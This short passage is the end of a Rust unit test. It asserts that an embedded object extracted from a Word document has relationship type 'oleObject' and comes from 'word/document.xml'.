    assert_eq!(embedded[0]["relationship_type"], "oleObject");
    assert_eq!(embedded[0]["source"], "word/document.xml");
}
